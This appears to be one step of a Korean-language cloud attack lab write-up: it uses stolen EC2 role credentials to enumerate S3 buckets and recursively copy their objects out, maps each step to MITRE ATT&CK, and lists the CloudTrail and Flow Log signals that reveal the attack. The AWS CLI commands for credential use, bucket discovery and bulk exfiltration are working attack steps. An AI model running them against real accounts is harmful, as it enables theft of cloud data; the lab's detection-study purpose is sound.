# 4단계: 정찰과 데이터 유출

MITRE ATT&CK: T1078.004 (Valid Accounts: Cloud), T1580 (Cloud Infrastructure Discovery),
T1619 (Cloud Storage Object Discovery), T1530 (Data from Cloud Storage)

## 배경

탈취한 EC2 역할의 임시 자격증명을 공격자 로컬(운영자 머신)에서 사용한다. 역할에 과대권한
(`s3:*` on `*`)이 있어 계정 내 모든 버킷을 열거하고 객체를 가져올 수 있다.

## 자격증명 적용

```bash
source stolen/creds.env   # 03_imds.sh가 만든 export 3줄 (AWS_ACCESS_KEY_ID/SECRET/SESSION_TOKEN)
aws sts get-caller-identity   # 어떤 역할로 인식되는지 확인 (T1078.004)
```

## 정찰

```bash
aws s3 ls                                   # 버킷 열거 (T1580)
aws s3 ls s3://<sensitive-bucket>/ --recursive   # 객체 열거 (T1619)
```

## 데이터 유출

```bash
mkdir -p stolen
aws s3 cp s3://<sensitive-bucket>/ ./stolen/ --recursive   # 객체 다운로드 (T1530)
```

## 분석 포인트 (핵심 IOC)

- 이 API 호출들은 CloudTrail에 남는다. 특히 `sourceIPAddress` 가 EC2 내부가 아니라 공격자
  (운영자) 공인 IP이고, `userAgent` 가 `aws-cli` 다. EC2 역할 자격증명이 정상적으로는 인스턴스
  내부에서만 쓰인다는 점과 대비되어, "인스턴스 자격증명의 외부 사용"이 강력한 탐지 신호가 된다.
- S3 `GetObject` 는 CloudTrail 데이터 이벤트로 기록된다(분석 환경에서 데이터 이벤트 로깅을 켜둔 이유).
- Flow Logs에는 유출 트래픽(외부로의 대량 전송) 흔적이 남는다.

## 실행 결과

실제 정찰·유출 시각, sourceIPAddress, 유출 객체 등 재구성된 타임라인은 `analysis/timeline.md`,
침해 지표는 `analysis/iocs.md` 참조.
